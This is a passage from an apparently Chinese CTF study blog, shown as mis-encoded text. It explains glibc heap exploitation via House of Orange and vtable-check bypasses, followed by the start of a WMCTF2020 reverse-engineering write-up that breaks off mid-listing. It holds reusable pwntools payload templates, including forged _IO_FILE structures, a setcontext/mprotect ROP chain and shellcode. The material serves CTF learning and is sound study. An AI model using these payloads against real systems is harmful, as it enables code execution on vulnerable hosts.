chunkçš„sizeä¸ºä¸€ä¸ªå°æ•°ï¼Œå†ç”³è¯·ä¸€ä¸ªå¤§äºè¯¥sizeçš„å †å—ï¼Œé‚£ä¹ˆç³»ç»Ÿä¼šè°ƒç”¨sysmallocé€šè¿‡brkæ‹“å±• top chunkï¼Œå…¶ä¸­å°±ä¼šfreeæ‰old_top_chunkã€‚\n2. é€šè¿‡ä¿®æ”¹bkè¿›è¡Œunsorted bin attackä¿®æ”¹_IO_list_allä¸ºunsorted binåœ°å€ï¼ˆmain_arena+88ï¼‰\n3. åŒæ—¶åœ¨å¯æ§çš„unsorted biné‡Œä¼ªé€ 0x60å¤§å°çš„IO_file_pluså’Œ vtable ç»“æ„\n\næ³¨ï¼šéœ€è¦ä¼ªé€ 0x60å¤§å°çš„å­—æ®µï¼ŒåŸå› æ˜¯unsorted bin attackä¹‹å_IO_list_allæ”¹ä¸ºmain_arena+88çš„åœ°å€ï¼Œæˆ‘ä»¬å¹¶ä¸å¯æ§ï¼Œè€Œ*chainåŸŸçš„åç§»æ˜¯0x68ï¼Œmain_arena+88+0x68åˆšå¥½æ˜¯small binçš„0x60å¤§å°ï¼Œå°†unsorted binä¸­çš„chunkçš„sizeä¿®æ”¹ä¸º0x60ä¸”åœ¨old top chunkä¸­å¸ƒç½®ä¼ªé€ çš„IO_FILEï¼Œå†™å…¥ä¹‹åï¼Œå†è¿›è¡Œç”³è¯·æ—¶ï¼Œå› ä¸ºå¤§å°ä¸åˆé€‚unsorted bin chunkå°±ä¼šè¢«é“¾å…¥smallbinçš„0x60æ•°ç»„ä¸­ï¼Œå³ä¼ªé€ çš„å †å—è¢«æ”¾å…¥äº†IO_FILEç»“æ„ä½“é“¾è¡¨ä¸­ï¼Œç”±äºunsorted binç»“æ„è¢«ç ´åï¼Œæ‰€ä»¥åœ¨ä¹‹åçš„æ£€æµ‹å‘ç”Ÿäº†æŠ¥é”™ï¼Œè¿™ä¸ªæŠ¥é”™å°±ä¼šè°ƒç”¨åˆ°\\_IO\\_flush_all\\_lockpï¼Œè€Œè¿™é‡Œå°±ä¼šå¯¹\\_IO_list_all è¿›è¡Œéå†ï¼Œè°ƒç”¨ _IO_OVERFLOW (fp, EOF) getshellã€‚\n\n```c\n/* remove from unsorted list */\nunsorted_chunks (av)->bk = bck;\nbck->fd = unsorted_chunks (av);\n...\n /* place chunk in bin */\n\nif (in_smallbin_range (size))\n{\n   victim_index = smallbin_index (size);\n   bck = bin_at (av, victim_index);\n   fwd = bck->fd;\n}\n//å…ˆè§£é“¾ï¼Œå†æ”¾å…¥small bin\n```\n\nå½“glibcæ£€æµ‹åˆ°å†…å­˜é”™è¯¯æ—¶ï¼Œä¼šä¾æ¬¡è°ƒç”¨è¿™æ ·çš„å‡½æ•°è·¯å¾„ï¼šmalloc_printerr -> libc_message->__GI_abort ->  _IO_flush_all_lockp -> _IO_OVERFLOWï¼Œ\\_IO_flush_all_lockp ä¼šæŠŠ _IO_list_allä½œä¸ºé“¾è¡¨å¤´å¼€å§‹éå†ï¼Œå¹¶æŠŠå½“å‰èŠ‚ç‚¹ä½œä¸º _IO_OVERFLOW çš„å‚æ•°ã€‚\n\n![image-20221116225235056](https://files.catbox.moe/r1xrri.png)\n\nä¼ªé€  fp->\\_mode = 0ï¼Œ fp->\\_IO_write_ptr > fp->_IO_write_baseæ¥é€šè¿‡éªŒè¯å³å¯\n\n64ä½çš„_IO_FILE_plusæ„é€ æ¨¡æ¿ï¼š\n\n```python\nstream = \"/bin/sh\\x00\" + p64(0x61)\nstream += p64(0xDEADBEEF) + p64(IO_list_all-0x10)\nstream += p64(1) + p64(2) # fp->_IO_write_ptr > fp->_IO_write_base\nstream = stream.ljust(0xc0,\"\\x00\")\nstream += p64(0) # mode<=0\nstream += p64(0)\nstream += p64(0)\nstream += p64(vtable_addr)  # heap_base + 0x5E8å½“å‰ä½ç½®\nstream += p64(0)*2  \nstream += p64(system_addr)  #_IO_OVERFLOW  \n```\n\n32ä½çš„_IO_FILE_plusæ„é€ æ¨¡æ¿ï¼š\n\n```python\nstream = \"sh\\x00\\x00\"+p32(0x31)   # system_call_parameter and link to small_bin[4] \nstream += \";$0\\x00\"+p32(IO_list_all-0x8)   # Unsorted_bin attack\nstream +=p32(1)+p32(2)     # fp->_IO_write_ptr > fp->_IO_write_base\nstream = stream.ljust(0x88,\"\\x00\")  \nstream += p32(0)    # mode<=0\nstream += p32(0)\nstream += p32(0)\nstream += p32(vtable_addr)  # vtable_addr --> system\n```\n\n64ä½ä¸‹seccompç¦ç”¨execveç³»ç»Ÿè°ƒç”¨çš„æ„é€ æ¨¡æ¿ï¼š\n\n```python\nio_list_all = libc_base+libc.symbols['_IO_list_all']\nsetcontext = libc_base+libc.symbols['setcontext']\nmprotect = libc_base+libc.symbols['mprotect']\nOpen = libc_base+libc.symbols['open']\nRead = libc_base+libc.symbols['read']\nWrite = libc_base+libc.symbols['write']\npop_rdi_ret = 0x0000000000400d93\npop_rsi_ret = libc_base+0x00000000000202e8\npop_rdx_ret = libc_base+0x0000000000001b92\npop_rdi_rbp_ret = libc_base+0x0000000000020256\npop_three_ret = 0x0000000000400d8f\nret = 0x00000000004008d9\n\ncontext.arch = 'amd64'\nshellcode = asm(shellcraft.amd64.linux.cat('flag'))\n\nrop = flat(\n    p64(pop_rdi_ret),\n    p64(current_io_chunk&~0xfff),\n    p64(pop_rsi_ret),\n    p64(0x1000),\n    p64(pop_rdx_ret),\n    p64(7),\n    p64(mprotect),\n)\nrop += p64(current_io_chunk+0x30+len(rop)+8)+shellcode\n\nfake_vtable = current_io_chunk+0xe0-0x18\n\npayload = p64(0) + p64(0x61)\npayload += p64(0xddaa) + p64(io_list_all-0x10)\npayload += p64(2) + p64(3)\npayload += rop\npayload = payload.ljust(0xa0,'\\x00')\npayload += p64(current_io_chunk+0x30) #rsp\npayload += p64(ret) # to rop\npayload = payload.ljust(0xd8,'\\x00')\npayload += p64(fake_vtable)\npayload += p64(setcontext+53) # 0xe0\n```\n\nå°†å‡½æ•°æ§åˆ¶æµæ§åˆ¶åœ¨ setcontext+53 çš„ä½ç½®ï¼Œæ˜¯å› ä¸ºè¿™é‡Œæ­£å¥½å¯ä»¥ä¿®æ”¹ rsp åˆ°æˆ‘ä»¬çš„å¯æ§åœ°å€æ¥è¿› è¡Œ ropï¼Œåœ¨åˆ‡æ ˆä¹‹åå°±å¯ä»¥æŒ‰ç…§å¦‚ä¸Šè¿‡ç¨‹æ‰§è¡Œ ropã€‚ é¦–å…ˆè°ƒç”¨ mprotect å‡½æ•°å°† å½“å‰ heap æ®µè®¾ç½®ä¸ºå¯æ‰§è¡Œï¼Œç„¶åè°ƒç”¨ cat flag çš„ shellcodeã€‚\n\n**glibc2.24ï¼š**\n\nåœ¨\\_IO\\_OVERFLOWåšäº†å°å°çš„æ”¹åŠ¨ï¼ŒIO\\_validate\\_vtableå¢åŠ äº†è™šè¡¨èŒƒå›´çš„æ£€æŸ¥ï¼Œä¹Ÿå°±æ˜¯è™šè¡¨åœ°å€å¿…é¡»ä½äº`__start___libc_IO_vtables`å’Œ`__stop___libc_IO_vtables`ä¹‹é—´ï¼Œæ˜¾ç„¶ä¹‹å‰åœ¨å †ä¸­ä¼ªé€ çš„è™šè¡¨ä¸æ»¡è¶³è¦æ±‚ã€‚\n\n![image-20221117144759735](https://files.catbox.moe/pf2bz8.png)\n\n**æ–¹æ³•ä¸€ï¼šåˆ©ç”¨_IO_str_overflow**  \n\nè™½ç„¶ä¸èƒ½æŠŠvtableæ”¹åˆ°å †ä¸Šäº†,ä½†æ˜¯æˆ‘ä»¬ä¾æ—§å¯ä»¥æ”¹ vtableä¸º_IO_str_jumpæ¥ç»•è¿‡æ£€æµ‹(\\_IO_str_jumpè¿™ä¸ªè™šè¡¨ä½äºä¸Šé¢çš„èŒƒå›´ä¹‹å†…)ï¼Œå› ä¸ºå…¶ä¸­ä½¿ç”¨çš„IO_str_overflow å‡½æ•°ä¼šè°ƒç”¨ FILE+0xe0å¤„çš„åœ°å€ã€‚è¿™æ—¶åªè¦æˆ‘ä»¬å°†è™šè¡¨è¦†ç›–ä¸º\\_IO_str_jumpså°†åç§»0xe0å¤„è®¾ç½®ä¸ºone_gadgetå³å¯ã€‚\n\n```c\n// libio/strops.c\nconst struct _IO_jump_t _IO_str_jumps libio_vtable =\n{\n  JUMP_INIT_DUMMY,\n  JUMP_INIT(finish, _IO_str_finish),\n  JUMP_INIT(overflow, _IO_str_overflow),\n  JUMP_INIT(underflow, _IO_str_underflow),\n  JUMP_INIT(uflow, _IO_default_uflow),\n  JUMP_INIT(pbackfail, _IO_str_pbackfail),\n  JUMP_INIT(xsputn, _IO_default_xsputn),\n  JUMP_INIT(xsgetn, _IO_default_xsgetn),\n  JUMP_INIT(seekoff, _IO_str_seekoff),\n  JUMP_INIT(seekpos, _IO_default_seekpos),\n  JUMP_INIT(setbuf, _IO_default_setbuf),\n  JUMP_INIT(sync, _IO_default_sync),\n  JUMP_INIT(doallocate, _IO_default_doallocate),\n  JUMP_INIT(read, _IO_default_read),\n  JUMP_INIT(write, _IO_default_write),\n  JUMP_INIT(seek, _IO_default_seek),\n  JUMP_INIT(close, _IO_default_close),\n  JUMP_INIT(stat, _IO_default_stat),\n  JUMP_INIT(showmanyc, _IO_default_showmanyc),\n  JUMP_INIT(imbue, _IO_default_imbue)\n};\n```\n\n![image-20221117154004353](https://files.catbox.moe/y4z42z.png)\n\néœ€è¦æ»¡è¶³çš„æ¡ä»¶æ˜¯ï¼š\n\n```c\n1.fp->_flags & _IO_NO_WRITESä¸ºå‡\n2.pos >= (_IO_size_t) (_IO_blen (fp) + flush_onlyä¸ºçœŸ\n3.fp->_flags & _IO_USER_BUFä¸ºå‡\n4._IO_size_t new_size = 2 * old_blen + 100 æŒ‡å‘\"/bin/sh\"\n5.(*((_IO_strfile *) fp)->_s._allocate_buffer)æŒ‡å‘systemçš„åœ°å€\n/*\n2. flush_only = EOF = 0; _IO_blen (fp) = fp->_IO_buf_end - fp->_IO_buf_base; æ‰€ä»¥ç¬¬2æ¡ç­‰äºpos = fp->_IO_write_ptr - fp->_IO_write_base\n4. ç»“åˆç¬¬4æ¡ï¼šnew_size = 2 * old_blen + 100 = 2 * (fp->_IO_buf_end - fp->_IO_buf_base) + 100 = bin_sh_addr\n5. _s._allocate_bufferåœ¨fpä¸­çš„åç§»æ˜¯0xe0ï¼Œå› æ­¤è¦è®¾ç½®ï¼š\n*/\nfp->_flags = 0 \nfp->_IO_buf_base = 0\nfp->_IO_buf_end = (bin_sh_addr - 100)/2\nfp->_IO_write_base = 0\nfp->_IO_write_ptr = (bin_sh_addr - 100)/2 æˆ– fp->_IO_write_ptr = 0xffffffff æˆ–æ ¹æœ¬ä¸è®¾ç½®è¯¥å€¼\nfp+0xe0 = system_addr\nfp->mode = 0\nvtable = _IO_str_jumps - 0x18\n```\n\n**æ–¹æ³•äºŒï¼šåˆ©ç”¨_IO_str_finish**\n\n![image-20221117160607396](https://files.catbox.moe/1jxlfs.png)\n\néœ€è¦æ»¡è¶³çš„æ¡ä»¶æ˜¯ï¼š\n\n```c\nfp->_IO_buf_baseä¸ºçœŸï¼Œ(fp->_flags & _IO_USER_BUF)ä¸ºå‡\nfp->_IO_buf_baseä¸ºbin_sh_addr\nfp->_s._free_bufferä¸ºsystemå‡½æ•°åœ°å€\n    \nfp->_flags = 0\nfp->_IO_buf_base = bin_sh_addr\nfp->_s._free_buffer = system_addr\nvtable = _IO_str_jumps - 0x8\n```\n\nåˆ©ç”¨ä¹‹å‰çš„House of Orangeï¼Œå°†vtableæ”¹ä¸º_IO_str_jumps - 0x8ï¼Œå› ä¸º\\_IO_str_finishåœ¨\\_IO_str_jumpsçš„åç§»ä¸åœ¨ä¸­åç§»ä¸åŒã€‚\n\n![image-20221117163009870](https://files.catbox.moe/wy1ir1.png)\n\nç”±äº `_IO_str_jumps` ä¸æ˜¯å¯¼å‡ºç¬¦å·ï¼Œå› æ­¤æ— æ³•ç›´æ¥åˆ©ç”¨ pwntools è¿›è¡Œå®šä½ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ `_IO_str_jumps`ä¸­çš„å¯¼å‡ºå‡½æ•°ï¼Œä¾‹å¦‚ `_IO_str_underflow` è¿›è¡Œè¾…åŠ©å®šä½ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨gdbå»æŸ¥æ‰¾æ‰€æœ‰åŒ…å«è¿™ä¸ª`_IO_str_underflow` å‡½æ•°åœ°å€çš„å†…å­˜åœ°å€ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n\n![image-20221117172435419](https://files.catbox.moe/idkgzn.png)\n\nå†åˆ©ç”¨ `_IO_str_jumps` çš„åœ°å€å¤§äº `_IO_file_jumps` åœ°å€çš„æ¡ä»¶ï¼Œå°±å¯ä»¥é”å®šæœ€åä¸€ä¸ªåœ°å€ä¸ºç¬¦åˆæ¡ä»¶çš„ `_IO_str_jumps` çš„åœ°å€ï¼Œç”±äº `_IO_str_underflow` åœ¨`_IO_str_jumps` çš„åç§»ä¸º0x20ï¼Œæˆ‘ä»¬å¯ä»¥è®¡ç®—å‡º`_IO_str_jumps` çš„åœ°å€ã€‚\n\n```python\ndef get_IO_str_jumps():\n\tIO_file_jumps_offset = libc.sym['_IO_file_jumps']\n\tIO_str_underflow_offset = libc.sym['_IO_str_underflow']\n\tfor ref_offset in libc.search(p64(IO_str_underflow_offset)):\n\t\tpossible_IO_str_jumps_offset = ref_offset - 0x20\n\t\tif possible_IO_str_jumps_offset > IO_file_jumps_offset:                                     return possible_IO_str_jumps_offset\n```\n\nå½©è›‹ï¼šglibc2.29çš„è™šè¡¨å¯å†™ï¼\n\n![image-20221117170950250](https://files.catbox.moe/cu3dhr.png)\n\n------\n\næœ€åè®°å½•ä¸€ä¸‹malloc_stateç»“æ„å’Œmallocå’Œfreeçš„æµç¨‹ï¼š\n\n```c\nmalloc_stateå°±æ˜¯å†…å­˜ä¸­ç”¨æ¥ç®¡ç†å †çš„æ•°æ®ç»“æ„ï¼Œæºç ä¸­è¡¨ç°å½¢å¼å¦‚ä¸‹\n\n/*ä¿å­˜å †çŠ¶æ€çš„ç»“æ„ä½“malloc_state*/\nstruct malloc_state\n{\n  /* Serialize access.  */\n  /*è¯¥å˜é‡ç”¨äºæ§åˆ¶ç¨‹åºä¸²è¡Œè®¿é—®åŒä¸€ä¸ªåˆ†é…åŒºï¼Œå½“ä¸€ä¸ªçº¿ç¨‹è·å–äº†åˆ†é…åŒºä¹‹åï¼Œå…¶å®ƒçº¿ç¨‹è¦æƒ³è®¿é—®è¯¥åˆ†é…åŒºï¼Œå°±å¿…é¡»ç­‰å¾…è¯¥çº¿ç¨‹åˆ†é…å®Œæˆåæ‰èƒ½å¤Ÿä½¿ç”¨ã€‚*/\n  __libc_lock_define (, mutex);\n\n  /* Flags (formerly in max_fast).  */\n  /*flags è®°å½•äº†åˆ†é…åŒºçš„ä¸€äº›æ ‡å¿—*/\n  int flags;\n\n  /* Set if the fastbin chunks contain recently inserted free blocks.  */\n  /* Note this is a bool but not all targets support atomics on booleans.  */\n  int have_fastchunks;/*æ˜¯å¦å­˜åœ¨fastbin*/\n\n  /* Fastbins ï¼ˆ0x20~0x80ï¼‰*/\n  mfastbinptr fastbinsY[NFASTBINS];/*è®°å½•fastbin*/\n\n  /* Base of the topmost chunk -- not otherwise kept in a bin */\n  mchunkptr top;/*è®°å½•top chunk*/\n\n  /* The remainder from the most recent split of a small request */\n  mchunkptr last_remainder;/*åˆ†å‰²åå‰©ä½™éƒ¨åˆ†*/\n\n  /* Normal bins packed as described above */\n  /* unsorted_bin small_bin(0x20-0x400) large_bin(>0x400) */\n    mchunkptr bins[NBINS * 2 - 2];\n\n  /* Bitmap of bins */\n  unsigned int binmap[BINMAPSIZE];/*æ ‡è¯†æŸä¸ªbinæ˜¯å¦ç©ºçš„map */\n\n  /* Linked list */\n  struct malloc_state *next;/*ä¸ä¸‹ä¸€ä¸ªmalloc_stateå½¢æˆåŒé“¾è¡¨*/\n\n  /* Linked list for free arenas.  Access to this field is serialized\n     by free_list_lock in arena.c.  */\n  struct malloc_state *next_free;\n\n  /* Number of threads attached to this arena.  0 if the arena is on\n     the free list.  Access to this field is serialized by\n     free_list_lock in arena.c.  */\n  INTERNAL_SIZE_T attached_threads;\n\n  /* Memory allocated from the system in this arena.  */\n  INTERNAL_SIZE_T system_mem;\n  INTERNAL_SIZE_T max_system_mem;\n};\n```\n\nptmalloc2å…±æœ‰127ä¸ªbinã€‚å…¶ä¸­62ä¸ªsmall binï¼Œ64ä¸ªlarge binä»¥åŠä¸€ä¸ªunsorted binã€‚malloc_stateçš„binsæ•°ç»„å­˜æ”¾äº†æ‰€æœ‰çš„binsä¿¡æ¯ï¼ˆé™¤tcacheï¼‰\n\nå…¶ä¸­`bin[0]bin[1]`ä¿å­˜äº†unsorted biné“¾è¡¨çš„å¤´æŒ‡é’ˆ.`bin[2]`å’Œ`bin[3]`åˆèµ·æ¥æŒ‡ç¤ºäº†ä¸€ä¸ªbinåŒé“¾è¡¨å°±æ˜¯å †çš„ç¬¬ä¸€ä¸ªsmall binï¼Œå…¶ä¸­`bin[2]`æ˜¯å¤´æŒ‡é’ˆï¼Œ`bin[3]`æ˜¯å°¾æŒ‡é’ˆã€‚\n\n**mallocï¼š**\n\n1.å¦‚æœsize < max fast, åœ¨fast binsä¸­å¯»æ‰¾fast chunkï¼Œ å¦‚æ‰¾åˆ°åˆ™ç»“æŸ\n2.å¦‚æœ(if) size in_ smallbin_ range, åœ¨small binsä¸­å¯»æ‰¾small chunk,å¦‚æ‰¾åˆ°åˆ™ç»“æŸ\n3.å¦‚æœ(else) size not in_smallbin_ rangeï¼Œ åˆå¹¶æ‰€æœ‰fastbinçš„chunk\n4.å¾ªç¯\nâ€”a.æ£€æŸ¥unsorted binä¸­çš„last_remainder(åˆå§‹ä¸º0)\n\t\tå¦‚æœæ»¡è¶³ä¸€ å®šæ¡ä»¶ï¼Œåˆ™åˆ†è£‚ä¹‹ï¼Œå°†å‰©ä½™çš„chunkæ ‡è®°ä¸ºæ–°çš„last remainder\nâ€”b.åœ¨unsorted binä¸­æœç´¢ï¼ŒåŒæ—¶è¿›è¡Œæ•´ç†\n\t\tå¦‚é‡åˆ°ç²¾ç¡®å¤§å°ï¼Œ åˆ™è¿”å›ï¼Œå¦åˆ™å°±æŠŠå½“å‰chunkæ•´ç†åˆ°small/large binä¸­å».\nâ€”c.åœ¨small binå’Œlarge binä¸­æœç´¢æœ€åˆé€‚çš„chunk (ä¸ä¸€å®šæ˜¯ç²¾ç¡®å¤§å°)\n5.ä½¿ç”¨top chunk\n\n> é€šå¸¸è¿™é‡Œä¼šä½¿ç”¨åˆ°unsorted binåˆ†å‰²çš„æ‰‹æ³•ï¼Œå³å·²æœ‰unsorted binï¼Œå†æ¬¡ç”³è¯·ä¸€ä¸ªå°å †å—ï¼Œå¦‚æœæ²¡æœ‰æ»¡è¶³æ¡ä»¶çš„å †å—å°±è¿›å…¥4.å¾ªç¯ï¼Œä¸€èˆ¬åˆå§‹last_remainderä¸º0ï¼Œæ‰€ä»¥è·³è¿‡æ­¥éª¤aï¼Œå°†æ­¤unsorted binæ•´ç†è¿›å…¥small bin(æˆ–large)ï¼Œç„¶åè¿›è¡Œæ­¥éª¤cï¼Œå°†small binåˆ†å‰²å¹¶åˆ†é…å‡ºæ¥( æ­¤æ—¶è¯¥å †å—ä¸­æ®‹ç•™smallbinçš„åœ°å€ï¼Œå¯ç”¨äºæ³„éœ²libc )ï¼Œå‰©ä¸‹çš„åˆ™è¿›å…¥unsorted binï¼Œæ ‡ä¸ºlast_remainderã€‚å†æ¬¡åˆ†å‰²unsorted binæ—¶ï¼Œæ­¤æ—¶last_remainderå­˜åœ¨ï¼Œåˆ™è¿›è¡Œæ­¥éª¤aã€‚\n\n**free:**\n\n1.å¦‚æœsize < max fast,æ”¾å…¥fast bin,ç»“æŸ\n2.å¦‚æœå‰ä¸€ä¸ªchunkæ˜¯freeçš„\nâ€”a. unlinkå‰é¢çš„chunk\nâ€”b.åˆå¹¶ä¸¤ä¸ªchunk(å‘ååˆå¹¶), å¹¶æ”¾å…¥unsorted bin\n3.å¦‚æœåä¸€ä¸ªchunkæ˜¯top chunk,åˆ™å°†å½“å‰chunkå¹¶å…¥top chunk(å‘å‰åˆå¹¶)\n4.å¦‚æœåä¸€ä¸ªchunkæ—¶freeçš„\nâ€”a. unlinkåé¢çš„chunk\nâ€”b. åˆå¹¶ä¸¤ä¸ªchunk(å‘å‰åˆå¹¶),å¹¶æ”¾å…¥unsorted bin\n5.å‰åchunkéƒ½ä¸æ˜¯freeçš„,æ”¾å…¥unsorted bin\n\n# 0x04 å°ç»“\n\nå †çš„åˆ©ç”¨çµæ´»å¤šå˜ï¼Œä¸”æƒ…å†µæ¯”æ ˆçš„åˆ©ç”¨å¤æ‚çš„å¤šï¼Œæˆ‘æ‰€è®°å½•çš„åªæ˜¯ä¸€äº›æœ€åŸºæœ¬ä¸”å¸¸è§çš„æ–¹æ³•ï¼Œä¾¿äºå¯¹å †æº¢å‡ºæ¼æ´åˆ©ç”¨æœ‰ä¸€ä¸ªæ¯”è¾ƒå®¢è§‚çš„è®¤è¯†ï¼Œè‡³äºæ›´å¤šæŠ€å·§ï¼Œåˆ™éœ€è¦è‡ªå·±ä¸æ–­å®è·µå’Œå­¦ä¹ ç§¯ç´¯æ¥è·å¾—ã€‚\n","tags":["KNOWLEDGE"],"categories":["LEARNING"]},{"title":"WMCTF2020","url":"/2020/08/05/WMCTF/","content":"\n# 0x00 å‰è¨€\n\nä¸»è¦è®°å½•ä¸¤é“é¢˜**WMare**(re)å’Œ**mengyedekending**(pwn)\n\n# 0x01 WMare\n\nå¥½ä¸€ä¸ªè™šæ‹Ÿæœºï¼è¿™é“é¢˜æ–­æ–­ç»­ç»­çœ‹äº†ä¸¤å¤©...é¦–å…ˆæ„Ÿè°¢æˆ‘[ç‚œå“¥](https://ljzjsc.com/)çš„è€å¿ƒæŒ‡å¯¼ï¼Œä»ç¨‹åºéƒ½ä¸ä¼šå¯åŠ¨åˆ°æ‘¸æ¸…æ•´ä¸ªç¨‹åºçš„è„‰ç»œï¼Œå…¨é ç‚œå“¥ä¸€æŠŠå±ä¸€æŠŠå°¿.... \n\n------\n\n## 0x02 [ä¼ é€é—¨](https://ljzjsc.com/index.php/archives/69/)\n\nç‚œå“¥åšå®¢é‡Œè®°å½•çš„å¾ˆè¯¦ç»†ï¼Œä»å¯åŠ¨åˆ°æ‰‹æ’•ä¸€æ°”å‘µæˆ/æ»‘ç¨½è„¸ï¼Œæˆ‘å°±ä¸å†èµ˜è¿°äº†ã€‚\n\nç‚¹å‡»ä¼ é€é—¨ç›´æ¥å¼€å¯æ–°ä¸–ç•Œã€‚\n\n------\n\n## 0x03 é‡åˆ°çš„é—®é¢˜\n\næˆ‘åªç®€å•åœ°è®°å½•ä¸€ä¸‹æˆ‘åœ¨è°ƒè¯•æ—¶é‡åˆ°çš„é—®é¢˜ã€‚\n\nä»ä¸€å¼€å§‹æ‰¾åˆ°`WELCOME TO WMCTF! INPUT:`ä»¥åŠè¾“å…¥å‡½æ•°éƒ½æ²¡å¤ªå¤§é—®é¢˜ï¼Œå…³é”®è¿˜æ˜¯åœ¨äºæœ€åçš„æ ¡éªŒå‡½æ•°ã€‚\n\næˆ‘å…ˆæ‹·ä¸€ä¸‹æ ¡éªŒçš„æ±‡ç¼–ï¼š\n\n```assembly\n0000000000006000: (                   ): jmp .+0 (0x00006002)      ; eb00\n0000000000006002: (                   ): xor ecx, ecx              ; 31c9\n0000000000006004: (                   ): cmp ecx, 0x00000081       ; 81f981000000\n000000000000600a: (                   ): jz .+226 (0x000060f2)     ; 0f84e2000000\n0000000000006010: (                   ): xor esi, esi              ; 31f6\n0000000000006012: (                   ): cmp esi, 0x00000009       ; 83fe09\n0000000000006015: (                   ): jz .+209 (0x000060ec)     ; 0f84d1000000\n000000000000601b: (                   ): xor edx, edx              ; 31d2\n000000000000601d: (                   ): mov eax, esi              ; 89f0\n000000000000601f: (                   ): inc eax                   ; 40\n0000000000006020: (                   ): mov ebx, 0x00000009       ; bb09000000\n0000000000006025: (                   ): div eax, ebx              ; f7f3\n0000000000006027: (                   ): mov edi, edx              ; 89d7\n0000000000006029: (                   ): xor edx, edx              ; 31d2\n000000000000602b: (                   ): mov eax, ecx              ; 89c8\n000000000000602d: (                   ): mov ebx, 0x00000003       ; bb03000000\n0000000000006032: (                   ): div eax, ebx              ; f7f3\n0000000000006034: (                   ): jz .+5 (0x0000603b)       ; 7405\n0000000000006036: (                   ): jnz .+3 (0x0000603b)      ; 7503\n0000000000006038: (                   ): ret 0x0099                ; c29900\n000000000000603b: (                   ): cmp edx, 0x00000000       ; 83fa00\n000000000000603e: (                   ): jz .+7 (0x00006047)       ; 7407\n0000000000006040: (                   ): cmp edx, 0x00000001       ; 83fa01\n0000000000006043: (                   ): jz .+56 (0x0000607d)      ; 7438\n0000000000006045: (                   ): jnz .+108 (0x000060b3)    ; 756c\n0000000000006047: (                   ): shl esi, 0x02             ; c1e602\n000000000000604a: (                   ): mov eax, dword ptr ds:[esi] ; 3e8b06\n000000000000604d: (                   ): shl edi, 0x02             ; c1e702\n0000000000006050: (                   ): mov ebx, dword ptr ds:[edi] ; 3e8b1f\n0000000000006053: (                   ): mov edx, eax              ; 89c2\n0000000000006055: (                   ): mov edi, ebx              ; 89df\n0000000000006057: (                   ): or eax, ebx               ; 09d8\n0000000000006059: (                   ): not edx                   ; f7d2\n000000000000605b: (                   ): not edi                   ; f7d7\n000000000000605d: (                   ): or edx, edi               ; 09fa\n000000000000605f: (                   ): and eax, edx              ; 21d0\n0000000000006061: (                   ): mov edx, eax              ; 89c2\n0000000000006063: (                   ): mov ebx, 0x24114514       ; bb14451124\n0000000000006068: (                   ): mov edi, ebx              ; 89df\n000000000000606a: (                   ): not eax                   ; f7d0\n000000000000606c: (                   ): not ebx                   ; f7d3\n000000000000606e: (                   ): and eax, ebx              ; 21d8\n0000000000006070: (                   ): not eax                   ; f7d0\n0000000000006072: (                   ): and edx, edi              ; 21fa\n0000000000006074: (                   ): not edx                   ; f7d2\n0000000000006076: (                   ): and eax, edx              ; 21d0\n0000000000006078: (                   ): mov dword ptr ds:[esi], eax ; 3e8906\n000000000000607b: (                   ): jmp .+102 (0x000060e3)    ; eb66\n000000000000607d: (                   ): shl esi, 0x02             ; c1e602\n0000000000006080: (                   ): mov eax, dword ptr ds:[esi] ; 3e8b06\n0000000000006083: (                   ): shl edi, 0x02             ; c1e702\n0000000000006086: (                   ): mov ebx, dword ptr ds:[edi] ; 3e8b1f\n0000000000006089: (                   ): mov edx, eax              ; 89c2\n000000000000608b: (                   ): mov edi, ebx              ; 89df\n000000000000608d: (                   ): not eax                   ; f7d0\n000000000000608f: (                   ): not ebx                   ; f7d3\n0000000000006091: (                   ): and eax, ebx              ; 21d8\n0000000000006093: (                   ): not eax                   ; f7d0\n0000000000006095: (                   ): and edx, edi              ; 21fa\n0000000000006097: (                   ): not edx                   ; f7d2\n0000000000006099: (                   ): and eax, edx              ; 21d0\n000000000000609b: (                   ): mov edx, eax              ; 89c2\n000000000000609d: (                   ): mov ebx, 0x01919810       ; bb10989101\n00000000000060a2: (                   ): mov edi, ebx              ; 89df\n00000000000060a4: (                   ): not ebx                   ; f7d3\n00000000000060a6: (                   ): and eax, ebx              ; 21d8\n00000000000060a8: (                   ): not edx                   ; f7d2\n00000000000060aa: (                   ): and edx, edi              ; 21fa\n00000000000060ac: (                   ): or eax, edx               ; 09d0\n00000000000060ae: (                   ): mov dword ptr ds:[esi], eax ; 3e8906\n00000000000060b1: (                   ): jmp .+48 (0x000060e3)     ; eb30\n00000000000060b3: (                   ): shl esi, 0x02             ; c1e602\n00000000000060b6: (                   ): mov eax, dword ptr ds:[esi] ; 3e8b06\n00000000000060b9: (                   ): shl edi, 0x02             ; c1e702\n00000000000060bc: (                   ): mov ebx, dword ptr ds:[edi] ; 3e8b1f\n00000000000060bf: (                   ): mov edx, eax              ; 89c2\n00000000000060c1: (                   ): mov edi, ebx              ; 89df\n00000000000060c3: (                   ): not ebx                   ; f7d3\n00000000000060c5: (                   ): and eax, ebx              ; 21d8\n00000000000060c7: (                   ): not edx                   ; f7d2\n00000000000060c9: (                   ): and edx, edi              ; 21fa\n00000000000060cb: (                   ): or eax, edx               ; 09d0\n00000000000060cd: (                   ): mov edx, eax              ; 89c2\n00000000000060cf: (                   ): mov ebx, 0x19260817       ; bb17082619\n00000000000060d4: (                   ): mov edi, ebx              ; 89df\n00000000000060d6: (                   ): or eax, ebx               ; 09d8\n00000000000060d8: (                   ): not edx                   ; f7d2\n00000000000060da: (                   ): not edi                   ; f7d7\n00000000000060dc: (                   ): or edx, edi               ; 09fa\n00000000000060de: (                   ): and eax, edx              ; 21d0\n00000000000060e0: (                   ): mov dword ptr ds:[esi], eax ; 3e8906\n00000000000060e3: (                   ): shr esi, 0x02             ; c1ee02\n00000000000060e6: (                   ): inc esi                   ; 46\n00000000000060e7: (                   ): jmp .-218 (0x00006012)    ; e926ffffff\n00000000000060ec: (                   ): inc ecx                   ; 41\n00000000000060ed: (                   ): jmp .-238 (0x00006004)    ; e912ffffff\n00000000000060f2: (                   ): xor ecx, ecx              ; 31c9\n00000000000060f4: (                   ): xor edx, edx              ; 31d2\n00000000000060f6: (                   ): cmp ecx, 0x00000012       ; 83f912\n00000000000060f9: (                   ): jz .+25 (0x00006114)      ; 7419\n00000000000060fb: (                   ): shl ecx, 0x01             ; d1e1\n00000000000060fd: (                   ): mov ax, word ptr 